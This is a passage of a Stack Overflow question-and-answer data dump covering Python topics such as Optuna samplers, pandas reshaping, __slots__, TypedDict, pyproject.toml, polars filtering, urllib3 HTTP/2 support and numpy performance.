    Returns formatted output for a dictionary with 
    string keys and float values.
    &quot;&quot;&quot;
    return dict((k, float(f'{v:{format}}')) for k,v in d.items())


def format_result(d: Dict[str, float], 
                  metric_value: float, 
                  header: str='', 
                  format: str=&quot;.4f&quot;): 
    &quot;&quot;&quot;Returns formatted result.&quot;&quot;&quot;
    msg = f&quot;&quot;&quot;Study Name: {header}\n{'='*30}
    
    ✅ study.best_params: \n\t{format_dict(d)}
    ✅ metric: {metric_value} 
    &quot;&quot;&quot;
    return msg


def study_contour_plot(study: optuna.Study, 
                       params: Optional[List[str]]=None, 
                       width: int=560, 
                       height: int=500):
    &quot;&quot;&quot;
    Create contour plots for a study, given a list or 
    tuple of two parameter names.
    &quot;&quot;&quot;
    if params is None:
        params = [&quot;dv&quot;, &quot;vc&quot;]
    fig = optuna.visualization.plot_contour(study, params=params)
    fig.update_layout(
        title=f'Contour Plot: {study.study_name} ({params[0]}, {params[1]})', 
        autosize=False,
        width=width, 
        height=height,
        margin=dict(l=65, r=50, b=65, t=90))
    fig.show()


bounds = [(0.2, 4), (300, 600), (0, 1000), (0, 1000)]
param_names = PARAM_NAMES # [&quot;ev&quot;, &quot;bv&quot;, &quot;vc&quot;, &quot;dv&quot;,]
pobjective = partial(objective, bounds=bounds)

# Create an empty dict to contain 
# various subsequent studies.
studies = dict()
</code></pre>
<p>Optuna comes with a few different types of Samplers. Samplers provide the strategy of how optuna is going to sample points from the parametr-space and evaluate the objective function.</p>
<ul>
<li><a href=""https://optuna.readthedocs.io/en/stable/reference/samplers.html"" rel=""nofollow noreferrer"">https://optuna.readthedocs.io/en/stable/reference/samplers.html</a></li>
</ul>
<h3>B.1 Use <code>TPESampler</code></h3>
<pre class=""lang-py prettyprint-override""><code>from optuna.samplers import TPESampler

sampler = TPESampler(seed=42)

study_name = &quot;TPESampler&quot;
studies[study_name] = optimize(
    pobjective, 
    sampler=sampler, 
    n_trials=100, 
    study_name=study_name,
)

# Study Name: TPESampler
# ==============================
#    
#     ✅ study.best_params: 
#   {'ev': 1.6233, 'bv': 585.2143, 'vc': 731.9939, 'dv': 598.6585}
#     ✅ metric: -0.0 
</code></pre>
<h3>B.2. Use <code>GridSampler</code></h3>
<p><strong>GridSampler</strong> requires a parameter search grid. Here we are using the following <code>search_space</code>.</p>
<p><a href=""https://i.stack.imgur.com/YEw1U.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/YEw1U.png"" alt=""search_space"" /></a></p>
<pre class=""lang-py prettyprint-override""><code>from optuna.samplers import GridSampler

# create search-space
search_space = make_param_grid(bounds=bounds, num_points=10, as_dict=True)

sampler = GridSampler(search_space)

study_name = &quot;GridSampler&quot;
studies[study_name] = optimize(
    pobjective, 
    sampler=sampler, 
    n_trials=2000, 
    study_name=study_name,
)

# Study Name: GridSampler
# ==============================
#    
#     ✅ study.best_params: 
#   {'ev': 0.2, 'bv': 500.0, 'vc': 222.2222, 'dv': 0.0}
#     ✅ metric: -88.33333333333337 
</code></pre>
<h3>B.3. Use <code>RandomSampler</code></h3>
<pre class=""lang-py prettyprint-override""><code>from optuna.samplers import RandomSampler

sampler = RandomSampler(seed=42)

study_name = &quot;RandomSampler&quot;
studies[study_name] = optimize(
    pobjective, 
    sampler=sampler, 
    n_trials=300, 
    study_name=study_name,
)

# Study Name: RandomSampler
# ==============================
#    
#     ✅ study.best_params: 
#   {'ev': 1.6233, 'bv': 585.2143, 'vc': 731.9939, 'dv': 598.6585}
#     ✅ metric: -0.0 
</code></pre>
<h2>C. Dummy Data</h2>
<p>For the sake of reproducibility, I am keeping a record of the dummy data used here.</p>
<pre class=""lang-py prettyprint-override""><code>import pandas as pd
import numpy as np
from scipy import optimize

cols = {
    'Dividend2': [9390, 7448, 177], 
    'Probability': [341, 376, 452], 
    'EV': [0.53, 0.60, 0.55], 
    'Dividend': [185, 55, 755], 
    'EV2': [123, 139, 544],
}

df = pd.DataFrame(cols)

def myFunc(params):
    &quot;&quot;&quot;myFunc metric.&quot;&quot;&quot;
    (ev, bv, vc, dv) = params
    df['Number'] = np.where(df['Dividend2'] &lt;= vc, 1, 0) \
                    + np.where(df['EV2'] &lt;= dv, 1, 0)
    df['Return'] =  np.where(
        df['EV'] &lt;= ev, 0, np.where(
            df['Probability'] &gt;= bv, 0, df['Number'] * df['Dividend'] - (vc + dv)
        )
    )
    return -1 * (df['Return'].sum())

b1 = [(0.2,4), (300,600), (0,1000), (0,1000)]
start = [0.2, 600, 1000, 1000]
result = optimize.minimize(fun=myFunc, bounds=b1, x0=start)
print(result)
</code></pre>
<h3>C.1. An Observation</h3>
<p>So, it seems at first glance that the code executed properly and did not throw any error. It says it had success in finding the minimized solution.</p>
<pre class=""lang-sh prettyprint-override""><code>      fun: -0.0
 hess_inv: &lt;4x4 LbfgsInvHessProduct with dtype=float64&gt;
      jac: array([0., 0., 3., 3.])
  message: b'CONVERGENCE: NORM_OF_PROJECTED_GRADIENT_&lt;=_PGTOL' # 💡
     nfev: 35
      nit: 2
   status: 0
  success: True
        x: array([2.e-01, 6.e+02, 0.e+00, 0.e+00]) # 🔥
</code></pre>
<p>A close observation reveals that the solution (see 🔥) is no different from the starting point <code>[0.2, 600, 1000, 1000]</code>. So, seems like nothing really happened and the algorithm just finished prematurely?!!</p>
<p>Now look at the <code>message</code> above (see 💡). If we run a google search on this, you could find something like this:</p>
<ul>
<li><p><strong>Summary</strong></p>
<blockquote>
<p><code>b'CONVERGENCE: NORM_OF_PROJECTED_GRADIENT_&lt;=_PGTOL'</code></p>
<p>If the loss-landscape does not have a smoothely changing topography, the gradient descent algorithms will soon find that from one iteration to the next, there isn't much change happening and hence, will terminate further seeking. Also, if the loss-landscape is rather flat, this could see similar fate and get early-termination.</p>
</blockquote>
<ul>
<li><a href=""https://stackoverflow.com/questions/60725549/scipy-optimize-minimize-does-not-perform-the-optimization-convergence-norm-of"">scipy-optimize-minimize does not perform the optimization - <code>CONVERGENCE: NORM_OF_PROJECTED_GRADIENT_&lt;=_PGTOL</code></a></li>
</ul>
</li>
</ul>
<h2>D. Making the Loss Landscape Smoother</h2>
<p>A binary evaluation of <code>value = 1 if x&gt;5 else 0</code> is essentially a step-function that assigns <code>1</code> for all values of <code>x</code> that are greater than <code>5</code> and <code>0</code> otherwise. But this introduces a kink - a discontinuity in smoothness and this could potentially introduce problems in traversing the loss-landscape.</p>
<p>What if we use a <code>sigmoid</code> function to introduce some smoothness?</p>

<img src=""https://latex.codecogs.com/svg.image?%5Clarge&space;%7B%5Ccolor%7BPink%7D&space;%5Csigma(x)&space;=&space;%5Cfrac%7B1%7D%7B1&space;&plus;&space;e%5E%7B-x%7D%7D%7D"" title=""https://latex.codecogs.com/svg.image?\large {\color{Pink} \sigma(x) = \frac{1}{1 + e^{-x}}}"" />
</p>

<pre class=""lang-py prettyprint-override""><code># Define sigmoid function
def sigmoid(x):
    &quot;&quot;&quot;Sigmoid function.&quot;&quot;&quot;
    return 1 / (1 + np.exp(-x))
</code></pre>
<p>For the above example, we could modify it as follows.</p>


<img src=""https://latex.codecogs.com/svg.image?%5Clarge&space;%7B%5Ccolor%7BPink%7D&space;%5Csigma((x&space;-&space;5))&space;=&space;%5Cfrac%7B1%7D%7B1&space;&plus;&space;e%5E%7B-(x&space;-&space;5)%7D%7D%7D"" title=""https://latex.codecogs.com/svg.image?\large {\color{Pink} \sigma((x - 5)) = \frac{1}{1 + e^{-(x - 5)}}}"" />
</p>
<p>You can additionally introduce another factor (<code>gamma</code>: γ) as follows and try to optimize it to make the landscape smoother. Thus by controlling the <em><code>gamma</code></em> factor, you could make the function smoother and change how quickly it changes around <code>x = 5</code></p>


<img src=""https://latex.codecogs.com/svg.image?%5Clarge&space;%7B%5Ccolor%7BPink%7D&space;%5Csigma((x&space;-&space;5)/%5Cgamma)&space;=&space;%5Cfrac%7B1%7D%7B1&space;&plus;&space;e%5E%7B-(x&space;-&space;5)/%5Cgamma%7D%7D%7D"" title=""https://latex.codecogs.com/svg.image?\large {\color{Pink} \sigma((x - 5)/\gamma) = \frac{1}{1 + e^{-(x - 5)/\gamma}}}"" />
</p>
<p><a href=""https://i.stack.imgur.com/D0BU7.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/D0BU7.png"" alt=""sigmoid-demo"" /></a></p>
<p>The above figure is created with the following code-snippet.</p>
<pre class=""lang-py prettyprint-override""><code>import matplotlib.pyplot as plt

%matplotlib inline 
%config InlineBackend.figure_format = 'svg' # 'svg', 'retina' 
plt.style.use('seaborn-white')

def make_figure(figtitle: str=&quot;Sigmoid Function&quot;):
    &quot;&quot;&quot;Make the demo figure for using sigmoid.&quot;&quot;&quot;

    x = np.arange(-20, 20.01, 0.01)
    y1 = sigmoid(x)
    y2 = sigmoid(x - 5)
    y3 = sigmoid((x - 5)/3)
    y4 = sigmoid((x - 5)/0.3)
    fig, ax = plt.subplots(figsize=(10,5))
    plt.sca(ax)
    plt.plot(x, y1, ls=&quot;-&quot;, label=&quot;$\sigma(x)$&quot;)
    plt.plot(x, y2, ls=&quot;--&quot;, label=&quot;$\sigma(x - 5)$&quot;)
    plt.plot(x, y3, ls=&quot;-.&quot;, label=&quot;$\sigma((x - 5) / 3)$&quot;)
    plt.plot(x, y4, ls=&quot;:&quot;, label=&quot;$\sigma((x - 5) / 0.3)$&quot;)
    plt.axvline(x=0, ls=&quot;-&quot;, lw=1.3, color=&quot;cyan&quot;, alpha=0.9)
    plt.axvline(x=5, ls=&quot;-&quot;, lw=1.3, color=&quot;magenta&quot;, alpha=0.9)
    plt.legend()
    plt.title(figtitle)
    plt.show()

make_figure()
</code></pre>
<h3>D.1. Example of Metric Smoothing</h3>
<p>The following is an example of how you could apply function smoothing.</p>
<pre class=""lang-py prettyprint-override""><code>from functools import partial

def sig(x, gamma: float=1.):
    return sigmoid(x/gamma)

def myFunc3(params, gamma: float=0.5):
    &quot;&quot;&quot;myFunc metric v3 with smoother metric.&quot;&quot;&quot;
    (ev, bv, vc, dv) = params
    _sig = partial(sig, gamma=gamma)
    df['Number'] = _sig(x = -(df['Dividend2'] - vc)) * 1 \
                    + _sig(x = -(df['EV2'] - dv)) * 1
    df['Return'] = (
        _sig(x = df['EV'] - ev) 
        * _sig(x = -(df['Probability'] - bv))
        * _sig(x = df['Number'] * df['Dividend'] - (vc + dv))
    )
    return -1 * (df['Return'].sum())
</code></pre>
"
"72871480","1","When should a static method be a function?","<p>I am writing a class for an image processing algorithm which has some methods, and notably a few static methods. My IDE keeps telling me to convert static methods to function which leads me to the following question:</p>
<p>When should a static method be turned into a function? When shouldn't it?</p>
","73039365","<p>There are no set rules in python regarding this decision, but there are style-guides defined e.g. by companies that look to solve the ambiguity of when to use what. One popular example of this would be the <a href=""https://google.github.io/styleguide/pyguide.html"" rel=""nofollow noreferrer"">Google Python Style Guide</a>:</p>
<blockquote>
<p>Never use staticmethod unless forced to in order to integrate with an API defined in an existing library. Write a module level function instead.</p>
</blockquote>
<p>My guess is, that your IDE follows this stance of a hard no against the staticmethod. If you decide, that you still want to use staticmethods, you can try to disable the warning by adding <a href=""https://stackoverflow.com/questions/45346575/what-does-noqa-mean-in-python-comments""># noqa</a> as a comment on the line where the warning is shown. Or you can look in your IDE for a setting to disable this kind of warning globally.</p>
<p>But this is only one opinion. There are some, that do see value in using staticmethods (<a href=""https://frasertweedale.github.io/blog-redhat/posts/2019-02-07-staticmethod-considered-beneficial.html"" rel=""nofollow noreferrer"">staticmethod considered beneficial</a>, <a href=""https://blog.devgenius.io/why-python-developers-should-use-staticmethod-and-classmethod-d5fe60497f23"" rel=""nofollow noreferrer"">Why Python Developers Should Use @staticmethod and @classmethod</a>), and there are others that argue against the usage of staticmethods (<a href=""https://www.seporaitis.net/posts/2020/05/05/python-staticmethod-usage/"" rel=""nofollow noreferrer"">Thoughts On @staticmethod Usage In Python</a>, <a href=""https://breadcrumbscollector.tech/staticmethod-considered-a-code-smell/"" rel=""nofollow noreferrer"">@staticmethod considered a code smell</a>)</p>
<p>Another <a href=""https://mail.python.org/pipermail/python-ideas/2016-July/041189.html"" rel=""nofollow noreferrer"">quote</a> that is often cited in this discussion is from Guido van Rossum (creator of Python):</p>
<blockquote>
<p>Honestly, staticmethod was something of a mistake -- I was trying to
do something like Java class methods but once it was released I found
what was really needed was classmethod. But it was too late to get rid
of staticmethod.</p>
</blockquote>
<hr />
<p>I have compiled a list of arguments that I found, without any evaluation or order.</p>
<h2>Pro module-level function:</h2>
<ul>
<li><p>Staticmethod lowers the cohesion of the class it is in as it is not using any of the attributes the class provides.</p>
</li>
<li><p>To call the staticmethod any other module <a href=""https://stackoverflow.com/questions/48178011/import-static-method-of-a-class-without-importing-the-whole-class"">needs to import the whole class</a> even if you just want to use that one method.</p>
</li>
<li><p>Staticmethod binds the method to the namespace of the class which makes it longer to write <code>SomeWhatDescriptiveClassName.method</code> instead of <code>method</code> and more work to refactor code if you change the class.</p>
</li>
<li><p>Easier reuse of method in other classes or contexts.</p>
</li>
<li><p>The call signature of a staticmethod is the same as that of a classmethod or instancemethod. This masks the fact that the staticmethod does not actually read or modify any object information especially when being called from an instance. A module-level function makes this explicit.</p>
</li>
</ul>
<h2>Pro staticmethod:</h2>
<ul>
<li><p>Being bound by an API your class has to work in, it can be the only valid option.</p>
</li>
<li><p>Possible usage of polymorphism for the method. Can overwrite the staticmethod in a subclass to change behaviour.</p>
</li>
<li><p>Grouping a method directly to a class it is meant to be used with.</p>
</li>
<li><p>Easier to refactor between classmethod, instancemethod and staticmethod compared to module-level functions.</p>
</li>
<li><p>Having the method under the namespace of the class can help with reducing possible namespace-collisions inside your module and reducing the namespace of your module overall.</p>
</li>
</ul>
<p>As I see it, there are no strong arguments for or against the staticmethod (except being bound by an API). So if you work in an organisation that provides a code standard to follow, just do that. Else it comes down to what helps you best to structure your code for maintainability and readability, and to convey the message of what your code is meant to do and how it is meant to be used.</p>
"
"73067450","1","Get row values as column values","<p>I have a single row data-frame like below</p>
<pre><code>Num     TP1(USD)    TP2(USD)    TP3(USD)    VReal1(USD)     VReal2(USD)     VReal3(USD)     TiV1 (EUR)  TiV2 (EUR)  TiV3 (EUR)  TR  TR-Tag
AA-24   0       700     2100    300     1159    2877    30       30     47      10  5
</code></pre>
<p>I want to get a dataframe like the one below</p>
<pre><code>ID  Price   Net     Range
1   0       300     30
2   700     1159    30
3   2100    2877    47
</code></pre>
<p>The logic here is that
a. there will be 3 columns names that contain TP/VR/TV. So in the ID, we have 1, 2 &amp; 3 (these can be generated by extracting the value from the column names or just by using a range to fill)
b. TP1 value goes into first row of column 'Price',TP2 value goes into second row of column 'Price' &amp; so on
c. Same for VR &amp; TV. The values go into 'Net' &amp; 'Range columns
d. Columns 'Num', 'TR'  &amp; 'TR=Tag' are not relevant for the result.</p>
<p>I tried <code>df.filter(regex='TP').stack()</code>. I get all the 'TP' column &amp; I can access individual values be index ([0],[1],[2]). I could not get all of them into a column directly.</p>
<p>I also wondered if there may be a easier way of doing this.</p>
","73067635","<p>Assuming <code>'Num'</code> is a unique identifier, you can use <a href=""https://pandas.pydata.org/docs/reference/api/pandas.wide_to_long.html"" rel=""noreferrer""><code>pandas.wide_to_long</code></a>:</p>
<pre><code>pd.wide_to_long(df, stubnames=['TP', 'VR', 'TV'], i='Num', j='ID')
</code></pre>
<p>or, for an output closer to yours:</p>
<pre><code>out = (pd
 .wide_to_long(df, stubnames=['TP', 'VR', 'TV'], i='Num', j='ID')
 .reset_index('ID')
 .drop(columns=['TR', 'TR-Tag'])
 .rename(columns={'TP': 'Price', 'VR': 'Net', 'TV': 'Range'})
 )
</code></pre>
<p>output:</p>
<pre><code>       ID  Price   Net  Range
Num                          
AA-24   1      0   300     30
AA-24   2    700  1159     30
AA-24   3   2100  2877     47
</code></pre>
<h5>updated answer</h5>
<pre><code>out = (pd
 .wide_to_long(df.set_axis(df.columns.str.replace(r'\(USD\)$', '', regex=True),
                           axis=1),
               stubnames=['TP', 'VReal', 'TiV'], i='Num', j='ID')
 .reset_index('ID')
 .drop(columns=['TR', 'TR-Tag'])
 .rename(columns={'TP': 'Price', 'VReal': 'Net', 'TiV': 'Range'})
 )
</code></pre>
<p>output:</p>
<pre><code>       ID  Price   Net  Range
Num                          
AA-24   1      0   300     30
AA-24   2    700  1159     30
AA-24   3   2100  2877     47
</code></pre>
"
"71802758","1","When using slots, why does dir(type) have no __dict__ attribute?","<p>I'm trying to understand slots. Therefore, I have written a little script with two classes, one using slots and one not.</p>
<pre><code>class A:
    def __init__(self, name):
        self.name = name

    def getName(self):
        return self.name

class C:
    __slots__ = &quot;name&quot;

    def __init__(self, name):
        self.name = name

    def getName(self):
        return self.name
</code></pre>
<p>When I use the <code>dir()</code> on type <code>A</code> and on an object of type <code>A</code>, the attribute <code>__dict__</code> appears in the result list, as expected.</p>
<pre><code>dir(A)
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'getName']

dir(A(&quot;test&quot;))
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'getName', 'name']
</code></pre>
<p>If I use type <code>C</code> I get</p>
<pre><code>print(dir(C))
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__slots__', '__str__', '__subclasshook__', 'classAttributeC', 'getName', 'name']

print(dir(C(&quot;test&quot;)))
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__slots__', '__str__', '__subclasshook__', 'classAttributeC', 'getName', 'name']
</code></pre>
<p>No attribute <code>__dict__</code> in the results list for <code>dir(C(&quot;test&quot;))</code>, as expected but also no attribute <code>__dict__</code> for <code>dir(C)</code>.
Why isn't the attribute in the results list when I can call <code>C.__dict__</code> and get the following output?</p>
<pre><code>{'__module__': '__main__', 'classAttributeC': 9999, '__slots__': 'name', '__init__': &lt;function C.__init__ at 0x7ff26b9ab730&gt;, 'getName': &lt;function C.getName at 0x7ff26b9ab7b8&gt;, 'name': &lt;member 'name' of 'C' objects&gt;, '__doc__': None}
</code></pre>
","71803126","<p>Since you don't override <code>__dir__</code> here, in each case here it will resolve in the MRO to <code>type.__dir__(A)</code> or <code>type.__dir__(C)</code>. So we look at the default implementation of <code>__dir__</code> for types, here in <a href=""https://github.com/python/cpython/blob/v3.10.4/Objects/typeobject.c#L4168-L4190"" rel=""nofollow noreferrer""><code>Objects/typeobject.c</code></a></p>
<pre class=""lang-c prettyprint-override""><code>/* __dir__ for type objects: returns __dict__ and __bases__.
   We deliberately don't suck up its __class__, as methods belonging to the
   metaclass would probably be more confusing than helpful.
*/
static PyObject *
type___dir___impl(PyTypeObject *self)
{
    PyObject *result = NULL;
    PyObject *dict = PyDict_New();

    if (dict != NULL &amp;&amp; merge_class_dict(dict, (PyObject *)self) == 0)
        result = PyDict_Keys(dict);

    Py_XDECREF(dict);
    return result;
}
</code></pre>
<p>The bases are the same <code>(object,)</code>, so there is your answer in the <code>__dict__</code>:</p>
<pre><code>&gt;&gt;&gt; &quot;__dict__&quot; in A.__dict__
True
&gt;&gt;&gt; &quot;__dict__&quot; in C.__dict__
False
</code></pre>
<p>So, types without slots implement a <code>__dict__</code> descriptor, but types which implement slots don't - and you just get a <code>__dict__</code> implementation from above:</p>
<pre><code>&gt;&gt;&gt; inspect.getattr_static(A, &quot;__dict__&quot;)
&lt;attribute '__dict__' of 'A' objects&gt;
&gt;&gt;&gt; inspect.getattr_static(C, &quot;__dict__&quot;)
&lt;attribute '__dict__' of 'type' objects&gt;
</code></pre>
"
"71814658","1","Python typing: Does TypedDict allow additional / extra keys?","<p>Does <code>typing.TypedDict</code> allow extra keys? Does a value pass the typechecker, if it has keys which are not present on the definition of the TypedDict?</p>
","71814659","<p>It depends.</p>
<p><a href=""https://peps.python.org/pep-0589/"" rel=""noreferrer"">PEP-589, the specification of <code>TypedDict</code>,</a> explicitely forbids extra keys:</p>
<blockquote>
<p>Extra keys included in TypedDict <strong>object construction</strong> should also be caught. In this example, the director key is not defined in Movie and is expected to generate an error from a type checker:</p>
<pre class=""lang-py prettyprint-override""><code>m: Movie = dict(
      name='Alien',
      year=1979,
      director='Ridley Scott')  # error: Unexpected key 'director'
</code></pre>
</blockquote>
<p>[highlighting by me]</p>
<p>The typecheckers mypy, pyre, pyright implement this according to the specification.</p>
<p>However, it is possible that a value with extra keys is accepted. This is because subtyping of TypedDicts is allowed, and the subtype might implement the extra key. PEP-589 only forbids extra keys in object construction, i.e. in literal assignment. As any value that complies with a subtype is always deemed to comply with the parent type and can be upcasted from the subtype to the parent type, an extra key can be introduced through a subtype:</p>
<pre class=""lang-py prettyprint-override""><code>from typing import TypedDict

class Movie(TypedDict):
    name: str
    year: int

class MovieWithDirector(Movie):
    director: str


# This is illegal:
movie: Movie = {
    'name': 'Ash is purest white', 
    'year': 2018, 
    'director': 'Jia Zhangke',
}    

# This is legal:
movie_with_director: MovieWithDirector = {
    'name': 'Ash is purest white', 
    'year': 2018, 
    'director': 'Jia Zhangke',
}

# This is legal, MovieWithDirector is a subtype of Movie
movie: Movie = movie_with_director  
</code></pre>
<p>In the example above, we see that the same value can sometimes be considered complying with <code>Movie</code> by the typing system, and sometimes not.</p>
<p>As a consequence of subtyping, typing a parameter as a certain TypedDict is not a safeguard against extra keys, because they could have been introduced through a subtype.</p>
<p>If your code is sensitive with regard to the presence of extra keys (for instance, if it makes use of <code>param.keys()</code>, <code>param.values()</code> or <code>len(param)</code> on the <code>TypedDict</code> parameter <code>param</code>), this could lead to problems when extra keys are present. A solution to this problem is to either handle the exceptional case that extra keys are actually present on the parameter or to make your code insensitive against extra keys.</p>
<p>If you want to test that your code is robust against extra keys, you cannot simply add a key in the test value:</p>
<pre><code>def some_movie_function(movie: Movie):
    # ...

def test_some_movie_function():
    # this will not be accepted by the type checker:
    result = some_movie_function({
        'name': 'Ash is purest white', 
        'year': 2018, 
        'director': 'Jia Zhangke',
        'genre': 'drama',
    })    
</code></pre>
<p>Workarounds are to either make the type checkers ignore the line or to create a subtype for your test, introducing the extra keys only for your test:</p>
<pre><code>class ExtendedMovie(Movie):
     director: str
     genre: str


def test_some_movie_function():
    extended_movie: ExtendedMovie = {
        'name': 'Ash is purest white', 
        'year': 2018, 
        'director': 'Jia Zhangke',
        'genre': 'drama',
    }

    result = some_movie_function(test_some_movie_function)
    # run assertions against result
} 
</code></pre>
"
"72373093","1","How to define ""python_requires"" in pyproject.toml using setuptools?","<p>Setuptools allows you to specify the minimum python version <a href=""https://stackoverflow.com/a/48777286/2135504"">as such</a>:</p>
<pre class=""lang-py prettyprint-override""><code>from setuptools import setup

[...]

setup(name=&quot;my_package_name&quot;,
      python_requires='&gt;3.5.2',
      [...]

</code></pre>
<p>However, how can you do this with the <a href=""https://setuptools.pypa.io/en/latest/userguide/pyproject_config.html"" rel=""noreferrer"">pyproject.toml</a>? The following two things did NOT work:</p>
<pre><code>[project]
...
# ERROR: invalid key 
python_requires = &quot;&gt;=3&quot;

# ERROR: no matching distribution found
dependencies = [&quot;python&gt;=3&quot;]
</code></pre>
","72462723","<p>According to <a href=""https://peps.python.org/pep-0621/"" rel=""noreferrer"">PEP 621</a>, the equivalent field in the <code>[project]</code> table is <a href=""https://peps.python.org/pep-0621/#requires-python"" rel=""noreferrer""><code>requires-python</code></a>.</p>
<p>More information about the list of valid configuration fields can be found in: <a href=""https://packaging.python.org/en/latest/specifications/declaring-project-metadata/"" rel=""noreferrer"">https://packaging.python.org/en/latest/specifications/declaring-project-metadata/</a>.</p>
<p>The equivalent <code>pyproject.toml</code> of your example would be:</p>
<pre class=""lang-ini prettyprint-override""><code>[project]
name = &quot;my_package_name&quot;
requires-python = &quot;&gt;3.5.2&quot;
...
</code></pre>
"
"71850031","1","Py Polars: How to filter using 'in' and 'not in' like in SQL","<p>How can I achieve the equivalents of SQL's IN and NOT IN?</p>
<p>I have a list with the required values. Here's the scenario:</p>
<pre><code>import pandas as pd
import polars as pl
exclude_fruit = [&quot;apple&quot;, &quot;orange&quot;]

df = pl.DataFrame(
    {
        &quot;A&quot;: [1, 2, 3, 4, 5, 6],
        &quot;fruits&quot;: [&quot;banana&quot;, &quot;banana&quot;, &quot;apple&quot;, &quot;apple&quot;, &quot;banana&quot;, &quot;orange&quot;],
        &quot;B&quot;: [5, 4, 3, 2, 1, 6],
        &quot;cars&quot;: [&quot;beetle&quot;, &quot;audi&quot;, &quot;beetle&quot;, &quot;beetle&quot;, &quot;beetle&quot;, &quot;frog&quot;],
        &quot;optional&quot;: [28, 300, None, 2, -30, 949],
    }
)
df.filter(~pl.select(&quot;fruits&quot;).str.contains(exclude_fruit))
df.filter(~pl.select(&quot;fruits&quot;).to_pandas().isin(exclude_fruit))
df.filter(~pl.select(&quot;fruits&quot;).isin(exclude_fruit))
</code></pre>
","71850319","<p>You were close.</p>
<pre class=""lang-py prettyprint-override""><code>df.filter(~pl.col('fruits').is_in(exclude_fruit))
</code></pre>
<pre><code>shape: (3, 5)
┌─────┬────────┬─────┬────────┬──────────┐
│ A   ┆ fruits ┆ B   ┆ cars   ┆ optional │
│ --- ┆ ---    ┆ --- ┆ ---    ┆ ---      │
│ i64 ┆ str    ┆ i64 ┆ str    ┆ i64      │
╞═════╪════════╪═════╪════════╪══════════╡
│ 1   ┆ banana ┆ 5   ┆ beetle ┆ 28       │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌┤
│ 2   ┆ banana ┆ 4   ┆ audi   ┆ 300      │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌┤
│ 5   ┆ banana ┆ 1   ┆ beetle ┆ -30      │
└─────┴────────┴─────┴────────┴──────────┘
</code></pre>
"
"71858905","1","Does urllib3 support HTTP/2 Requests? Will it?","<p>I know the following about various python HTTP libraries:</p>
<ul>
<li><a href=""https://docs.python-requests.org/en/latest/"" rel=""noreferrer"">Requests</a> does <a href=""https://stackoverflow.com/q/44931070/1473320"">not support HTTP/2 requests</a>.</li>
<li><a href=""https://github.com/python-hyper/hyper"" rel=""noreferrer"">Hyper</a> does support HTTP/2 requests, but is archived as of <a href=""https://github.com/python-hyper/hyper/commit/b77e758f472f00b098481e3aa8651b0808524d84"" rel=""noreferrer"">early 2021</a> and wouldn't be a good choice for new projects.</li>
<li><a href=""https://www.python-httpx.org/"" rel=""noreferrer"">HTTPX</a> does support HTTP/2, but this support is <a href=""https://www.python-httpx.org/http2/"" rel=""noreferrer"">optional, requires installing extra dependencies, and comes with some caveats about rough edges</a>.</li>
<li><a href=""https://docs.aiohttp.org/en/stable/index.html"" rel=""noreferrer"">AIOHTTP</a> does <a href=""https://docs.aiohttp.org/en/stable/changes.html?highlight=http2#id532"" rel=""noreferrer"">not support HTTP2 yet</a> (as of mid April 2022).
<ul>
<li>The focus of this project is also not solely on being a client -- this package also includes a server.</li>
</ul>
</li>
</ul>
<p>The other major HTTP request library I'm aware of is <a href=""https://urllib3.readthedocs.io/en/stable/"" rel=""noreferrer"">urllib3</a>. This is what <a href=""https://openapi-generator.tech/"" rel=""noreferrer"">OpenAPI Generator</a> uses by default when generating python client libraries.</p>
<p>My Questions are:</p>
<p><strong>Can urrlib3 be configured to make HTTP/2 requests?</strong></p>
<p>I cannot find any information on http2 support in <a href=""https://urllib3.readthedocs.io/en/stable/reference/index.html#"" rel=""noreferrer"">the documentation</a>, and through my testing of a generated OpenAPI client, all requests are HTTP/1.1. If the answer is no currently, <strong>are the maintainers planning HTTP/2 support</strong>? I cannot find any evidence of this in the project's <a href=""https://github.com/urllib3/urllib3/issues?q=is%3Aissue+%22http%2F2%22"" rel=""noreferrer"">open issues</a>.</p>
","71874365","<p>I asked about this in the urllib3 discord, and got an answer from <a href=""https://github.com/pquentin"" rel=""noreferrer"">one of the maintainers</a> that corroborates what <a href=""https://stackoverflow.com/users/1883316/tim-roberts"">Tim Roberts</a> commented;</p>
<ul>
<li>Proper HTTP/2 implementations require async/await to take advantage of the main different feature in HTTP/2, which is <a href=""https://web.dev/performance-http2/"" rel=""noreferrer"">making requests in parallel</a>.</li>
<li>urllib3 in particular is not planning to support this because it'll in general require a rewrite.</li>
</ul>
"
"73062386","1","Adding single integer to numpy array faster if single integer has python-native int type","<p>I add a single integer to an array of integers with 1000 elements. This is faster by 25% when I first cast the single integer from <code>numpy.int64</code> to the python-native <code>int</code>.</p>
<p>Why? Should I, as a general rule of thumb convert the single number to native python formats for single-number-to-array operations with arrays of about this size?</p>
<p>Note: may be related to my previous question <a href=""https://stackoverflow.com/q/73053617/5269892"">Conjugating a complex number much faster if number has python-native complex type</a>.</p>
<pre><code>import numpy as np

nnu = 10418
nnu_use = 5210
a = np.random.randint(nnu,size=1000)
